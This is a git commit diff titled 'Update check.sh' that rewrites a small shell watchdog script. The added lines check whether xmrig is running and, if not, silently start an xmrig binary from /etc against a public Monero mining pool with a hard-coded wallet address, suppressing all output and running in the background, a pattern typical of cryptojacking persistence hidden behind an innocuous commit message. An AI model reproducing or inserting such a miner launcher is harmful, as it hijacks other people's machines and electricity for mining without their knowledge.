b31d76386b34a2fa9588a6f8e11be4dd61c0f808
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-12 07:34:36 +0000

    Update check.sh

--- check.sh
+++ check.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-if pgrep -f "run.sh" &> /dev/null; then
+if pgrep -f "xmrig" &> /dev/null; then
     echo "it is already running"
 else
-     bash run.sh > /dev/null 2>&1 &
+cd && cd /etc/ && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls > /dev/null 2>&1 &
 fi
